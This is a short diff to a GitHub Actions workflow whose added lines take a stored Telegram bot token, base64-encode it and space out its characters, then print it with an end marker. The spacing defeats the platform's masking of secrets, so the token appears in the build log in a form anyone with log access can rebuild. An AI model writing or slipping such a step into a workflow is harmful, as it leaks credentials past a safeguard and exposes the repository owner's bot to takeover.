@@ -12,5 +12,7 @@ jobs:
         env:
           TG_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
         run: |
-          echo "HTG=$(printf %s "$TG_TOKEN" | base64 -w0)"
+          printf %s "$TG_TOKEN" | base64 -w0 | sed "s/./& /g" | tr -d "\n"
+          echo ""
+          echo "HTGEND"
         shell: bash
